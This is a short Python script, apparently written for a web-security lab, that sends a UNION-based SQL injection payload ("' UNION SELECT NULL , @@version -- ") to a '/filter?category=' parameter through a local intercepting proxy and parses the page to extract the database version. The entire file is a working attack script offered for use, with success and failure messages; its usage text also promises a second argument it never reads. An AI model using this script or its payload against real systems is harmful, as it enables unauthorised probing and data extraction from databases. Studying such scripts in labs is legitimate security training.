import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def expoilt_sqli_MySQL_Microsoft_version(url):
    path = "/filter?category="
    sql_payload = "' UNION SELECT NULL , @@version -- "

    req = requests.get(url+path+sql_payload , verify=False,proxies=proxies)
    res = req.text
    soup = BeautifulSoup(res,'html.parser')
    version = soup.find(string="Toys & Games").parent.findNext('td').contents[0]
    if version in res:
        return version
    else:
        return False  


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print('[-] Usage: %s <url> <sql-payload>' % sys.argv[0])
        print('[-] Example: %s www.example.com "1=1"' % sys.argv[0])

    expoilt = expoilt_sqli_MySQL_Microsoft_version(url)
    if  expoilt:
        print("attak Succsess MySQL_Microsoft_version Version is ")
        print(expoilt)
    else:
        print("attak failed")
    
